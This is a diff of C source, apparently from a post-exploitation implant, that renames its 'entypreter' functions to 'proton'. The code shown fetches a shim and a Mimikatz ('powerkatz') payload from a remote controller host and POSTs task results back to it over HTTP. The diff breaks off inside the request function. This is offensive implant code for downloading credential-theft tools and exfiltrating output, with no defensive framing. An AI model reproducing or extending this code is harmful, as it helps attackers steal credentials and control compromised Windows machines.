@@ -1,44 +1,44 @@
-#include "entypreter_net.h"
+#include "proton_net.h"
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 
-BOOL entypreter_http_get_x64_shim(entypreter_shim_parsed *parsed, char **data, LPDWORD dwSize)
+BOOL proton_http_get_x64_shim(proton_shim_parsed *parsed, char **data, LPDWORD dwSize)
 {
 	char header[160] = { 0 };
 	sprintf(header, "%s: %s", parsed->uuidHeader, parsed->uuidShimx64);
 
-	return entypreter_http_request(parsed->host, parsed->port, parsed->secure, "POST", parsed->path, header, strlen(header), NULL, 0, data, dwSize);
+	return proton_http_request(parsed->host, parsed->port, parsed->secure, "POST", parsed->path, header, strlen(header), NULL, 0, data, dwSize);
 }
 
-BOOL entypreter_http_get_powerkatz(entypreter_shim_parsed *parsed, char **data, LPDWORD dwSize)
+BOOL proton_http_get_powerkatz(proton_shim_parsed *parsed, char **data, LPDWORD dwSize)
 {
 	char header[160] = { 0 };
 	sprintf(header, "%s: %s", parsed->uuidHeader, sizeof(void*) == 4 ? parsed->uuidMimix86 : parsed->uuidMimix64);
 
-	return entypreter_http_request(parsed->host, parsed->port, parsed->secure, "POST", parsed->path, header, strlen(header), NULL, 0, data, dwSize);
+	return proton_http_request(parsed->host, parsed->port, parsed->secure, "POST", parsed->path, header, strlen(header), NULL, 0, data, dwSize);
 }
 
 
-BOOL entypreter_http_report_error(entypreter_shim_parsed *parsed, char *work)
+BOOL proton_http_report_error(proton_shim_parsed *parsed, char *work)
 {
-	return entypreter_http_report_work(parsed, work);
+	return proton_http_report_work(parsed, work);
 }
 
-BOOL entypreter_http_report_work(entypreter_shim_parsed *parsed, char *work)
+BOOL proton_http_report_work(proton_shim_parsed *parsed, char *work)
 {
 	BOOL ret = FALSE;
 	char *data;
 	DWORD dwSize;
 
 	//MessageBoxA(NULL, work, "DEBUG", MB_OK);
-	ret = entypreter_http_request(parsed->host, parsed->port, parsed->secure, "POST", parsed->path, NULL, 0, work, strlen(work), &data, &dwSize);
+	ret = proton_http_request(parsed->host, parsed->port, parsed->secure, "POST", parsed->path, NULL, 0, work, strlen(work), &data, &dwSize);
 
 	free(data);
 	return ret;
 }
 
-BOOL entypreter_http_request(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
+BOOL proton_http_request(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
 	LPCSTR postData, SIZE_T nPostDataSize, char **data, LPDWORD dwDataSize)
 {
 	HINTERNET hIntSession = NULL;
